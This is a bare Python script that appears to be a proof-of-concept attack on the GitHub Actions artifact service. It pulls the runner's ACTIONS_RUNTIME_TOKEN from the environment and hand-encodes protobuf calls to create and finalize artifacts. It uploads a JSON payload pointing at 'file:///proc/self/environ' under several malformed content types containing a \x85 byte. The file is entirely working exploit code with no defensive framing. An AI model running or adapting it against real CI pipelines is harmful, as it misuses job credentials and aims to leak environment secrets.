import base64, hashlib, json, os, time, urllib.request

def varint(n):
    out=bytearray()
    while n>0x7f: out.append((n&0x7f)|0x80); n>>=7
    out.append(n); return bytes(out)
def fs(num,v): return varint(num<<3|2)+varint(len(v))+v
def fv(num,v): return varint(num<<3)+varint(v)
def wrap(v): return fs(1,v)
def read_fields(d):
    out=[];i=0
    def rv():
        nonlocal i
        val=0;s=0
        while True:
            b=d[i];i+=1;val|=(b&0x7f)<<s
            if not b&0x80: return val
            s+=7
    while i<len(d):
        k=rv();num=k>>3;wire=k&7
        if wire==0: v=rv()
        elif wire==2:
            ln=rv();v=d[i:i+ln];i+=ln
        else: raise ValueError(wire)
        out.append((num,wire,v))
    return out

tok=os.environ['ACTIONS_RUNTIME_TOKEN']; base=os.environ['ACTIONS_RESULTS_URL'].rstrip('/')
claims=json.loads(base64.urlsafe_b64decode(tok.split('.')[1]+'==='))
scope=next(x for x in claims['scp'].split() if x.startswith('Actions.Results:'))
_,run,job=scope.split(':')
svc='github.actions.results.api.v1.ArtifactService'
P='application/json\x85'
payload=json.dumps({'full_name':'x','owner':{'login':'u','avatar_url':'file:///proc/self/environ'},'description':'','stargazers_count':0},separators=(',',':')).encode()
variants=[
 ('a1',[fv(5,7),fs(6,wrap(P.encode('latin1')))],'application/json'),
 ('a2',[fv(5,7),fs(6,wrap(P.encode('utf-8')))],'application/json'),
 ('a3',[fv(5,7),fs(6,wrap(b'application/json'))],P.encode('latin1')),
 ('a4',[fv(5,7)],P.encode('latin1')),
 ('a5',[fv(5,7),fs(6,wrap(P.encode('latin1')))],P.encode('latin1')),
]
def post(url,body):
    r=urllib.request.Request(url,data=body,method='POST',headers={'Authorization':'Bearer '+tok,'Content-Type':'application/protobuf'})
    return urllib.request.urlopen(r,timeout=30)
def put(url,data,ct):
    r=urllib.request.Request(url,data=data,method='PUT',headers={'x-ms-blob-type':'BlockBlob','x-ms-blob-content-type':ct})
    return urllib.request.urlopen(r,timeout=30)

for label,tail,blobct in variants:
    try:
        name=f'{label}-{int(time.time()*1000)}.json'
        req=fs(1,run.encode())+fs(2,job.encode())+fs(3,name.encode())+b''.join(tail)
        c=post(f'{base}/twirp/{svc}/CreateArtifact',req)
        cb=c.read()
        signed=next(v.decode() for n,w,v in read_fields(cb) if n==2 and w==2)
        put(signed,payload,blobct)
        digest=b'sha256:'+hashlib.sha256(payload).hexdigest().encode()
        fin=fs(1,run.encode())+fs(2,job.encode())+fs(3,name.encode())+fv(4,len(payload))+fs(5,wrap(digest))
        f=post(f'{base}/twirp/{svc}/FinalizeArtifact',fin)
        fb=f.read()
        aid=next(v for n,w,v in read_fields(fb) if n==2 and w==0)
        print('RESULT',label,'id',aid,'name',name)
    except Exception as e:
        print('RESULT',label,'ERR',repr(e)[:160])
